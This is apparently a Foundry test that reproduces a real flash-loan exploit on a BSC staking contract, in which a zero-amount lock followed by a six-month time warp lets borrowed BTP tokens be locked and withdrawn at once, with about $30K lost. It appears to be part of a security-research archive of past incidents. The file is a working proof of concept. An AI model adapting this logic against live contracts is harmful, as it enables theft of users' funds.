// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~30K US$
// Attacker : https://bscscan.com/address/0x878a36edfb757e8640ff78b612f839b63adc2e51
// Attack Contract : https://bscscan.com/address/0x7b9265c6aa4b026b7220eee2e8697bf5ffa6bb9a
// Vulnerable Contract : https://bscscan.com/address/0x9d6d817ea5d4a69ff4c4509bea8f9b2534cec108
// Attack Tx : https://bscscan.com/tx/0x1ae499ccf292a2ee5e550702b81a4a7f65cd03af2c604e2d401d52786f459ba6

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9d6d817ea5d4a69ff4c4509bea8f9b2534cec108#code

// @Analysis
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1657411284076478465

interface IStaking {
    function Lock_Token(uint256 plan, uint256 _amount) external;
    function withdraw(uint256 _plan) external;
}

contract ContractTest is Test {
    IERC20 BTP = IERC20(0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019);
    IStaking Staking = IStaking(0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x858DE6F832c9b92E2EA5C18582551ccd6add0295);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 flashAmount = 219_349 * 1e18;

    function setUp() public {
        cheats.createSelectFork("bsc", 28_176_675);
    }

    function testExploit() public {
        firstLock();

        cheats.warp(block.timestamp + 6 * 30 * 24 * 60 * 60 + 1000); // lock 6 month

        Pair.swap(flashAmount, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("Attacker BTP balance after exploit", BTP.balanceOf(address(this)), BTP.decimals());
    }

    function firstLock() internal {
        Staking.Lock_Token(1, 0);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        BTP.approve(address(Staking), type(uint256).max);
        Staking.Lock_Token(1, BTP.balanceOf(address(this)));
        Staking.withdraw(1);
        BTP.transfer(msg.sender, flashAmount * 10_000 / 9975 + 1000);
    }
}
